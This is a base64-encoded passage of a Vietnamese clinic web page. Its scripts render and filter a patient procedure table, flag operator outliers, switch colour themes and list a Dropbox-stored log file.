hdyA9IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyB8fCBbXTsNCiAgbGV0IGhlcmJzID0gaGVyYnNSYXcubWFwKGg9Pih7DQogICAgLi4uaCwNCiAgICBvcENsZWFuOiBjbGVhbkRpc3BsYXkoaC5vcGVyYXRvciksDQogICAgb3BOb3JtOiBub3JtKGgub3BlcmF0b3IpDQogIH0pKTsNCg0KICAvLyBu4bq/dSBjaGVja2JveCBi4bqtdCB0aMOsIGzhu41jIGzhuqFpIGhlcmJzIGNo4buJIGPDsm4gbmjhu69uZyBuZ8OgeSBjw7MgbOG7l2kNCiAgaWYob25seUVycm9yRGF5c0NiICYmIG9ubHlFcnJvckRheXNDYi5jaGVja2VkKXsNCiAgICBjb25zdCBlcnJvckRhdGVzID0gZ2V0SGVyYkVycm9yRGF0ZXMoaGVyYnMpOw0KICAgIGhlcmJzID0gaGVyYnMuZmlsdGVyKGggPT4gZXJyb3JEYXRlcy5pbmNsdWRlcyhoLmRhdGUpKTsNCiAgICBpZihzdW1tYXJ5RGl2KXsNCiAgICAgIGlmKGVycm9yRGF0ZXMubGVuZ3RoKXsNCiAgICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUwgPSBgPGI+xJBhbmcgaGnhu4NuIHRo4buLIGPDoWMgbmfDoHkgY8OzIGzhu5dpIHPhuq9jIHRodeG7kWM6PC9iPiAke2Vycm9yRGF0ZXMuam9pbignLCAnKX1gOw0KICAgICAgfSBlbHNlIHsNCiAgICAgICAgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBzdW1tYXJ5RGl2LmlubmVySFRNTCA9ICcnOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KDQogIC8vIGto4bufaSB04bqhbyBzZWxlY3QgbuG6v3UgY2jGsGENCiAgaWYoIWRhdGVGaWx0ZXIuZGF0YXNldC5pbml0aWFsaXplZCl7DQogICAgY29uc3QgdW5pcXVlRGF0ZXMgPSBbLi4ubmV3IFNldChoZXJicy5tYXAoaD0+aC5kYXRlKSldLnNvcnQoKGEsYik9PnsNCiAgICAgIGNvbnN0IFtkYSxtYSx5YV0gPSBhLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICBjb25zdCBbZGIsbWIseWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLG1hLTEsZGEpIC0gbmV3IERhdGUoeWIsbWItMSxkYik7DQogICAgfSk7DQogICAgY29uc3QgdW5pcXVlRG9jdG9ycyA9IFsuLi5uZXcgU2V0KGhlcmJzLm1hcChoPT5oLmRvY3Rvcnx8J0tow7RuZyBjw7MnKSldLnNvcnQoKTsNCiAgICBkYXRlRmlsdGVyLmlubmVySFRNTCA9DQogICAgICAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICB1bmlxdWVEYXRlcy5tYXAoZD0+YDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICBkb2N0b3JGaWx0ZXIuaW5uZXJIVE1MID0NCiAgICAgICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgYsOhYyBzxKk8L29wdGlvbj4nICsNCiAgICAgIHVuaXF1ZURvY3RvcnMubWFwKGQ9PmA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQogICAgZGF0ZUZpbHRlci5kYXRhc2V0LmluaXRpYWxpemVkID0gJ3RydWUnOw0KICAgIGRhdGVGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgd2luZG93LnJlbmRlckhlcmJMaXN0KTsNCiAgICBkb2N0b3JGaWx0ZXIuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgd2luZG93LnJlbmRlckhlcmJMaXN0KTsNCiAgICBpZihvbmx5RXJyb3JEYXlzQ2Ipew0KICAgICAgb25seUVycm9yRGF5c0NiLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCk7DQogICAgfQ0KICB9DQoNCiAgY29uc3Qgc2VsZWN0ZWREYXRlID0gZGF0ZUZpbHRlci52YWx1ZTsNCiAgY29uc3Qgc2VsZWN0ZWREb2N0b3IgPSBkb2N0b3JGaWx0ZXIudmFsdWU7DQoNCiAgY29uc3QgZmlsdGVyZWQgPSBoZXJicy5maWx0ZXIocCA9Pg0KICAgIChzZWxlY3RlZERhdGUgPT09ICdhbGwnIHx8IHAuZGF0ZSA9PT0gc2VsZWN0ZWREYXRlKSAmJg0KICAgIChzZWxlY3RlZERvY3RvciA9PT0gJ2FsbCcgfHwgcC5kb2N0b3IgPT09IHNlbGVjdGVkRG9jdG9yKQ0KICApOw0KDQogIGlmKGZpbHRlcmVkLmxlbmd0aCA9PT0gMCl7DQogICAgY29uc3QgdHIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgIHRyLmNsYXNzTmFtZSA9ICdoZXJiLXJvdyc7DQogICAgdHIuaW5uZXJIVE1MID0gJzx0ZCBjb2xzcGFuPSI1Ij48Y2VudGVyPktow7RuZyBjw7MgZOG7ryBsaeG7h3Ugc+G6r2MgdGh14buRYyB0aGFuZzwvY2VudGVyPjwvdGQ+JzsNCiAgICB0Ym9keS5hcHBlbmRDaGlsZCh0cik7DQogICAgaWYoc3VtbWFyeURpdikgc3VtbWFyeURpdi5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgICByZXR1cm47DQogIH0NCg0KICBjb25zdCBtYWpvcml0eSA9IGNvbXB1dGVNYWpvcml0eUJ5RGF0ZShoZXJicyk7DQogIGNvbnN0IG91dGxpZXJzSW5WaWV3ID0gW107DQoNCiAgZmlsdGVyZWQuZm9yRWFjaChwPT57DQogICAgY29uc3QgdHIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgIHRyLmNsYXNzTmFtZSA9ICdoZXJiLXJvdyc7DQogICAgY29uc3QgbSA9IG1ham9yaXR5W3AuZGF0ZV07DQogICAgY29uc3QgaGFzTWFqb3JpdHkgPSBtICYmIG0udG9wTm9ybSAmJiBtLnRvcENvdW50ID4gbS5zZWNvbmRDb3VudDsNCiAgICBpZihoYXNNYWpvcml0eSAmJiBwLm9wTm9ybSAhPT0gbS50b3BOb3JtKXsNCiAgICAgIHRyLmNsYXNzTGlzdC5hZGQoJ2hlcmItb3V0bGllcicpOw0KICAgICAgb3V0bGllcnNJblZpZXcucHVzaChwKTsNCiAgICB9DQogICAgdHIuaW5uZXJIVE1MID0gYA0KICAgICAgPHRkPiR7cC5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgIDx0ZD4ke3AucHJvY2VkdXJlfTwvdGQ+DQogICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgIDx0ZD4ke3AuZGlzcGxheVN0YXJ0fSAmcmFycjsgJHtwLmRpc3BsYXlFbmR9PC90ZD4NCiAgICAgIDx0ZD4ke3Aub3BDbGVhbn08L3RkPg0KICAgIGA7DQogICAgdGJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICB9KTsNCg0KICBpZihzdW1tYXJ5RGl2ICYmICghb25seUVycm9yRGF5c0NiIHx8ICFvbmx5RXJyb3JEYXlzQ2IuY2hlY2tlZCkpew0KICAgIGlmKG91dGxpZXJzSW5WaWV3Lmxlbmd0aCl7DQogICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J2Jsb2NrJzsNCiAgICAgIHN1bW1hcnlEaXYuaW5uZXJIVE1MID0NCiAgICAgICAgYDxhIGhyZWY9IiMiIGlkPSJoZXJiT3V0bGllckNvdW50TGluayI+Q8OzICR7b3V0bGllcnNJblZpZXcubGVuZ3RofSBjYSBjw7MgduG6pW4gxJHhu4EgdHJvbmcgZGFuaCBzw6FjaCBuw6B5LjwvYT5gOw0KICAgICAgY29uc3QgbGluayA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdoZXJiT3V0bGllckNvdW50TGluaycpOw0KICAgICAgbGluay5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uKGV2KXsNCiAgICAgICAgZXYucHJldmVudERlZmF1bHQoKTsNCiAgICAgICAgaWYobW9kYWxCb2R5KXsNCiAgICAgICAgICBtb2RhbEJvZHkuaW5uZXJIVE1MID0gJyc7DQogICAgICAgICAgb3V0bGllcnNJblZpZXcuZm9yRWFjaChwPT57DQogICAgICAgICAgICBjb25zdCB0ciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICB0ci5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICAgIDx0ZD4ke3AucGF0aWVudE5hbWV9IFs8Zm9udCBjb2xvcj0icmVkIj4ke3AucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtwLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLmRhdGV9PC90ZD4NCiAgICAgICAgICAgICAgPHRkPiR7cC5kaXNwbGF5U3RhcnR9ICZyYXJyOyAke3AuZGlzcGxheUVuZH08L3RkPg0KICAgICAgICAgICAgICA8dGQ+JHtwLm9wQ2xlYW59PC90ZD4NCiAgICAgICAgICAgIGA7DQogICAgICAgICAgICBtb2RhbEJvZHkuYXBwZW5kQ2hpbGQodHIpOw0KICAgICAgICAgIH0pOw0KICAgICAgICB9DQogICAgICAgIGlmKG1vZGFsSW5mbyl7DQogICAgICAgICAgY29uc3Qgbm90ZURhdGUgPSAoc2VsZWN0ZWREYXRlPT09J2FsbCcpID8gJ25oaeG7gXUgbmfDoHknIDogc2VsZWN0ZWREYXRlOw0KICAgICAgICAgIG1vZGFsSW5mby50ZXh0Q29udGVudCA9IGBU4buVbmcgJHtvdXRsaWVyc0luVmlldy5sZW5ndGh9IGNhIGtow6FjIMSRYSBz4buRICgke25vdGVEYXRlfSkuYDsNCiAgICAgICAgfQ0KICAgICAgICBpZihtb2RhbCkgbW9kYWwuc3R5bGUuZGlzcGxheT0nYmxvY2snOw0KICAgICAgfSwge29uY2U6dHJ1ZX0pOw0KICAgIH0gZWxzZSB7DQogICAgICBzdW1tYXJ5RGl2LnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICAgICAgc3VtbWFyeURpdi5pbm5lckhUTUw9Jyc7DQogICAgfQ0KICB9DQp9Ow0KDQoNCiAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpPT57DQogICAgY29uc3QgdGFibGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlByb2NlZHVyZVRhYmxlJyk7DQogICAgaWYodGFibGUgJiYgdGFibGUuc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnKXsNCiAgICAgIHdpbmRvdy5yZW5kZXJIZXJiTGlzdCgpOw0KICAgIH0NCiAgfSk7DQp9KSgpOw0KDQoNCg0KDQo8L3NjcmlwdD4NCjxzY3JpcHQ+DQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLCBmdW5jdGlvbiAoKSB7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KICAgIGNvbnN0IGFuYWx5emVCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpOw0KICAgIGlmIChmaWxlSW5wdXQgJiYgYW5hbHl6ZUJ0bikgew0KICAgICAgZmlsZUlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgICAgICAgYW5hbHl6ZUJ0bi5jbGljaygpOw0KICAgICAgfSk7DQogICAgfQ0KICB9KTsNCjwvc2NyaXB0Pg0KDQoNCjwhLS0gVEhFTUUgUElDS0VSIFNDUklQVCAtLT4NCjxzY3JpcHQ+DQooZnVuY3Rpb24oKXsNCiAgY29uc3QgVEhFTUVfS0VZID0gJ3VpQWNjZW50VGhlbWUnOw0KICBjb25zdCBib2R5ID0gZG9jdW1lbnQuYm9keTsNCiAgY29uc3QgcGlja2VyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3RoZW1lUGlja2VyJyk7DQogIGlmKCFwaWNrZXIpIHJldHVybjsNCiAgZnVuY3Rpb24gYXBwbHlUaGVtZSh0KXsNCiAgICBib2R5LmNsYXNzTGlzdC5yZW1vdmUoJ3RoZW1lLWRlZmF1bHQnLCd0aGVtZS1vcmFuZ2UnLCd0aGVtZS1yZWQnLCd0aGVtZS1ncmVlbicpOw0KICAgIGlmKHQgJiYgdCAhPT0gJ2RlZmF1bHQnKXsNCiAgICAgIGJvZHkuY2xhc3NMaXN0LmFkZCgndGhlbWUtJyt0KTsNCiAgICB9IGVsc2Ugew0KICAgICAgYm9keS5jbGFzc0xpc3QuYWRkKCd0aGVtZS1kZWZhdWx0Jyk7IC8vIGV4cGxpY2l0IMSR4buDIGFjdGl2ZSByaW5nDQogICAgfQ0KICAgIHBpY2tlci5xdWVyeVNlbGVjdG9yQWxsKCcudGhlbWUtc3dhdGNoJykuZm9yRWFjaChidG49PnsNCiAgICAgIGJ0bi5jbGFzc0xpc3QudG9nZ2xlKCdpcy1hY3RpdmUnLCBidG4uZGF0YXNldC50aGVtZT09PXQgfHwgKHQ9PT0nJyAmJiBidG4uZGF0YXNldC50aGVtZT09PSdkZWZhdWx0JykpOw0KICAgIH0pOw0KICAgIHRyeXsgbG9jYWxTdG9yYWdlLnNldEl0ZW0oVEhFTUVfS0VZLHR8fCdkZWZhdWx0Jyk7IH1jYXRjaChlKXt9DQogIH0NCiAgY29uc3Qgc2F2ZWQgPSAoZnVuY3Rpb24oKXt0cnl7cmV0dXJuIGxvY2FsU3RvcmFnZS5nZXRJdGVtKFRIRU1FX0tFWSkgfHwgJ2RlZmF1bHQnO31jYXRjaChlKXtyZXR1cm4gJ2RlZmF1bHQnO319KSgpOw0KICBhcHBseVRoZW1lKHNhdmVkKTsNCiAgcGlja2VyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJyxlPT57DQogICAgY29uc3QgYnRuID0gZS50YXJnZXQuY2xvc2VzdCgnLnRoZW1lLXN3YXRjaCcpOw0KICAgIGlmKCFidG4pIHJldHVybjsNCiAgICBhcHBseVRoZW1lKGJ0bi5kYXRhc2V0LnRoZW1lKTsNCiAgfSk7DQp9KSgpOw0KPC9zY3JpcHQ+DQoNCjxzY3JpcHQ+DQpmdW5jdGlvbiB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCgpIHsNCiAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2hlcmJUb2dnbGVCdG4nKTsNCiAgaWYgKCFidG4gfHwgIXdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgcmV0dXJuOw0KDQogIGNvbnN0IGhlcmJzID0gd2luZG93LmFsbEhlcmJQcm9jZWR1cmVzOw0KICBjb25zdCBjb3VudHMgPSB7fTsNCg0KICBoZXJicy5mb3JFYWNoKGggPT4gew0KICAgIGNvbnN0IGRhdGUgPSBoLmRhdGU7DQogICAgY29uc3Qga2V5ID0gZGF0ZTsNCiAgICBpZiAoIWNvdW50c1trZXldKSBjb3VudHNba2V5XSA9IHt9Ow0KICAgIGNvbnN0IG5hbWUgPSAoaC5vcGVyYXRvciB8fCAnS2jDtG5nIGPDsycpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KICAgIGNvdW50c1trZXldW25hbWVdID0gKGNvdW50c1trZXldW25hbWVdIHx8IDApICsgMTsNCiAgfSk7DQoNCiAgbGV0IG91dGxpZXJDb3VudCA9IDA7DQoNCiAgT2JqZWN0LmtleXMoY291bnRzKS5mb3JFYWNoKGRhdGUgPT4gew0KICAgIGNvbnN0IG9wcyA9IGNvdW50c1tkYXRlXTsNCiAgICBjb25zdCBlbnRyaWVzID0gT2JqZWN0LmVudHJpZXMob3BzKS5zb3J0KChhLCBiKSA9PiBiWzFdIC0gYVsxXSk7DQogICAgY29uc3QgdG9wID0gZW50cmllc1swXTsNCiAgICBpZiAoIXRvcCkgcmV0dXJuOw0KDQogICAgY29uc3QgdG9wTmFtZSA9IHRvcFswXTsNCiAgICBjb25zdCB0b3BDb3VudCA9IHRvcFsxXTsNCg0KICAgIGZvciAoY29uc3QgW25hbWUsIGNvdW50XSBvZiBlbnRyaWVzKSB7DQogICAgICBpZiAobmFtZSAhPT0gdG9wTmFtZSAmJiBjb3VudCA+IDApIHsNCiAgICAgICAgb3V0bGllckNvdW50ICs9IGNvdW50Ow0KICAgICAgfQ0KICAgIH0NCiAgfSk7DQoNCmJ0bi5pbm5lckhUTUwgPSBgU+G6r2MgdGh14buRYyB0aGFuZyA8aSBjbGFzcz0iZmEtc29saWQgZmEtdHJpYW5nbGUtZXhjbGFtYXRpb24iIHN0eWxlPSJjb2xvcjp5ZWxsb3ciPjwvaT4gPHNwYW4gc3R5bGU9ImNvbG9yOnllbGxvdzsgZm9udC13ZWlnaHQ6Ym9sZCI+KCR7b3V0bGllckNvdW50fSk8L3NwYW4+YDsNCg0KDQp9DQo8L3NjcmlwdD4NCjxkaXYgaWQ9ImRyb3Bib3hQYW5lbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTsgcG9zaXRpb246Zml4ZWQ7IGluc2V0OjA7IGJhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpOyB6LWluZGV4Ojk5OTk7Ij4NCiAgPGRpdiBzdHlsZT0ibWFyZ2luOjUlIGF1dG87IGJhY2tncm91bmQ6I2ZmZjsgcGFkZGluZzoyMHB4OyBtYXgtd2lkdGg6OTAlOyBib3JkZXItcmFkaXVzOjEwcHg7IG1heC1oZWlnaHQ6ODB2aDsgb3ZlcmZsb3c6YXV0byI+DQogICA8ZGl2IHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47IGFsaWduLWl0ZW1zOiBjZW50ZXI7Ij4NCiAgPGgzPvCfk4IgRGFuaCBzw6FjaCBLaG9hIMSRw6Mgc+G7rSBk4bulbmcgcGjhuqduIG3hu4FtPC9oMz4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIm9uY2xpY2s9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFuZWwnKS5zdHlsZS5kaXNwbGF5PSdub25lJyJzdHlsZT0icGFkZGluZzo4cHggMTRweDsgZm9udC1zaXplOjEzcHg7IGJvcmRlci1yYWRpdXM6NHB4OyI+DQogICAgxJDDs25nDQogIDwvYnV0dG9uPg0KPC9kaXY+DQo8IS0tIFBhZ2luYXRpb24gY29udHJvbHMgLS0+DQo8ZGl2IGlkPSJkcm9wYm94UGFnZXIiIHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2dhcDo4cHg7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47bWFyZ2luLXRvcDoxMnB4Ij4NCiAgPGRpdj4NCiAgICBIaeG7g24gdGjhu4sNCiAgICA8c2VsZWN0IGlkPSJkcm9wYm94UGFnZVNpemUiIHN0eWxlPSJwYWRkaW5nOjZweCA4cHg7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO2JvcmRlci1yYWRpdXM6NnB4Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9IjEwIiBzZWxlY3RlZD4xMDwvb3B0aW9uPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iMjAiPjIwPC9vcHRpb24+DQogICAgICA8b3B0aW9uIHZhbHVlPSI1MCI+NTA8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgICBkw7JuZyAvIHRyYW5nDQogIDwvZGl2Pg0KDQogIDxkaXYgaWQ9ImRyb3Bib3hQYWdlQnV0dG9ucyIgc3R5bGU9ImRpc3BsYXk6ZmxleDtnYXA6NnB4O2ZsZXgtd3JhcDp3cmFwIj48L2Rpdj4NCg0KICA8ZGl2IGlkPSJkcm9wYm94UGFnZUluZm8iIHN0eWxlPSJtaW4td2lkdGg6MTcwcHg7dGV4dC1hbGlnbjpyaWdodCI+PC9kaXY+DQo8L2Rpdj4NCiAgICA8dGFibGUgYm9yZGVyPSIxIiBjZWxscGFkZGluZz0iOCIgc3R5bGU9IndpZHRoOjEwMCU7IGJvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTsgZm9udC1zaXplOjE0cHgiPg0KICAgICAgPHRoZWFkPg0KICAgICAgICA8dHI+DQogICAgICAgICAgPHRoPlNUVDwvdGg+DQogICAgICAgICAgPHRoPlTDqm4ga2hvYTwvdGg+DQogICAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgICA8dGg+U+G6r2MgdGh14buRYzwvdGg+DQogICAgICAgICA8dGg+U2FpIHRo4budaSBnaWFuPC90aD4NCiAgICAgICA8dGg+VHLDuW5nIGdp4budPC90aD4NCiAgICAgICANCiAgICAgICAgICA8dGg+VGjhu51pIGdpYW48L3RoPg0KCQkgIDx0aD5MaW5rPC90aD4NCgkJICA8dGg+WG/DoTwvdGg+DQogICAgICAgIDwvdHI+DQogICAgICA8L3RoZWFkPg0KICAgICAgPHRib2R5IGlkPSJkcm9wYm94RmlsZUxpc3QiPjwvdGJvZHk+DQogICAgPC90YWJsZT4NCiAgDQogIDwvZGl2Pg0KPC9kaXY+PHNjcmlwdD4NCmFzeW5jIGZ1bmN0aW9uIHNob3dEcm9wYm94UGFuZWwoKSB7DQphd2FpdCBlbnN1cmVEcm9wYm94KCk7IC8vIMSR4bqjbSBi4bqjbyBjw7MgRHJvcGJveCBTREsNCg0KICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveEZpbGVMaXN0Jyk7DQoNCiAgLy8gSGnhu4duIHBvcHVwIG5nYXkgbOG6rXAgdOG7qWMgduG7m2kgdHLhuqFuZyB0aMOhaSBsb2FkaW5nDQogIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjkiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6Ymx1ZTsiPg0KICAgIMSQYW5nIHThuqNpIGThu68gbGnhu4d1Li4uDQogIDwvdGQ+PC90cj5gOw0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhbmVsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQoNCiAgdHJ5IHsNCiAgICAvLyAxKSBLaeG7g20gdHJhIHThu5NuIHThuqFpIGxvZy5qc29uDQogICAgbGV0IGhhc0xvZyA9IGZhbHNlOw0KICAgIGxldCByZXMgPSBhd2FpdCBkYnguZmlsZXNMaXN0Rm9sZGVyKHsgcGF0aDogJy90aHV0aHVhdCcgfSk7DQogICAgd2hpbGUgKHRydWUpIHsNCiAgICAgIGlmIChyZXMucmVzdWx0Py5lbnRyaWVzPy5zb21lKGUgPT4gZVsnLnRhZyddID09PSAnZmlsZScgJiYgZS5uYW1lID09PSAnbG9nLmpzb24nKSkgew0KICAgICAgICBoYXNMb2cgPSB0cnVlOw0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAgIGlmICghcmVzLnJlc3VsdD8uaGFzX21vcmUpIGJyZWFrOw0KICAgICAgcmVzID0gYXdhaXQgZGJ4LmZpbGVzTGlzdEZvbGRlckNvbnRpbnVlKHsgY3Vyc29yOiByZXMucmVzdWx0LmN1cnNvciB9KTsNCiAgICB9DQoNCiAgICAvLyAyKSBO4bq/dSBraMO0bmcgY8OzIGZpbGUg4oaSIGPhuq1wIG5o4bqtdCBu4buZaSBkdW5nDQogICAgaWYgKCFoYXNMb2cpIHsNCiAgICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICAgIEtow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHUNCiAgICAgIDwvdGQ+PC90cj5gOw0KICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIC8vIDMpIEPDsyBmaWxlIOKGkiB04bqjaSB2w6AgaGnhu4NuIHRo4buLDQogICAgY29uc3QgZGwgPSBhd2FpdCBkYnguZmlsZXNEb3dubG9hZCh7IHBhdGg6ICcvdGh1dGh1YXQvbG9nLmpzb24nIH0pOw0KICAgIGNvbnN0IHRleHQgPSBhd2FpdCBkbC5yZXN1bHQuZmlsZUJsb2IudGV4dCgpOw0KICAgIGxldCBsb2dzID0gW107DQogICAgdHJ5IHsgbG9ncyA9IEpTT04ucGFyc2UodGV4dCk7IH0gY2F0Y2ggeyBsb2dzID0gW107IH0NCg0KICAgIGlmICghbG9ncy5sZW5ndGgpIHsNCiAgICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjsgY29sb3I6cmVkOyI+DQogICAgICAgIEtow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHUNCiAgICAgIDwvdGQ+PC90cj5gOw0KICAgIH0gZWxzZSB7DQogY29uc3QgY3VycmVudFVzZXIgPSAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpIHx8ICcnKS50b0xvd2VyQ2FzZSgpOw0KDQovLyBSZW5kZXIgbeG7m2kg4oCTIGdpYW8gY2hvIGLhu5kgcGjDom4gdHJhbmc6DQpEQl9MT0dTID0gbG9nczsgLy8gbeG6o25nIGThu68gbGnhu4d1IMSR4bqneSDEkeG7pw0KREJfUEFHRSA9IDE7ICAgIC8vIHbhu4EgdHJhbmcgMSBt4buXaSBraGkgbeG7nyBwYW5lbA0KREJfQ1VSUkVOVF9VU0VSID0gKHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKSB8fCAnJykudG9Mb3dlckNhc2UoKTsNCg0KYXR0YWNoUGFnZXJFdmVudHNPbmNlKCk7IC8vIGfhuq9uIGNoYW5nZSBjaG8gc2VsZWN0IHBhZ2Ugc2l6ZSAoY2jhu4kgMSBs4bqnbikNCnJlbmRlckRyb3Bib3hQYWdlKCk7ICAgICAvLyB24bq9IHRib2R5ICsgbsO6dCB0cmFuZyB04burIERCX0xPR1MNCiAgICB9DQogIH0gY2F0Y2ggKGVycikgew0KICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkeG7jWMgZGFuaCBzw6FjaCB04burIERyb3Bib3g6JywgZXJyKTsNCiAgICB0Ym9keS5pbm5lckhUTUwgPSBgPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXI7IGNvbG9yOnJlZDsiPg0KICAgICAgS2jDtG5nIHRo4buDIHThuqNpIGThu68gbGnhu4d1DQogICAgPC90ZD48L3RyPmA7DQogIH0NCn0NCihmdW5jdGlvbigpew0KICBjb25zdCBwYWdlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94UGFnZXInKTsNCiAgaWYgKHBhZ2VyICYmICFwYWdlci5kYXRhc2V0LmJvdW5kKSB7DQogICAgcGFnZXIuZGF0YXNldC5ib3VuZCA9ICcxJzsNCiAgICBwYWdlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGUgPT4gZS5zdG9wUHJvcGFnYXRpb24oKSk7DQogICAgcGFnZXIuYWRkRXZlbnRMaXN0ZW5lcignbW91c2Vkb3duJywgZSA9PiBlLnN0b3BQcm9wYWdhdGlvbigpKTsNCiAgfQ0KfSkoKTsNCg0KPC9zY3JpcHQ+DQoNCg0KDQo8c2NyaXB0Pg0KZnVuY3Rpb24gdmVyaWZ5QW5kT3BlbkxpbmsodXJsKSB7DQoNCg0KICAvLyBPdmVybGF5IHThu5FpIChjbGljayB2w6BvIHPhur0gdOG6r3QpDQogIGNvbnN0IG92ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgT2JqZWN0LmFzc2lnbihvdmVybGF5LnN0eWxlLCB7DQogICAgcG9zaXRpb246ICdmaXhlZCcsIGluc2V0OiAnMCcsIGJhY2tncm91bmQ6ICdyZ2JhKDAsMCwwLDAuNSknLA0KICAgIGRpc3BsYXk6ICdmbGV4JywganVzdGlmeUNvbnRlbnQ6ICdjZW50ZXInLCBhbGlnbkl0ZW1zOiAnY2VudGVyJywNCiAgICB6SW5kZXg6ICcxMDAwMCcNCiAgfSk7D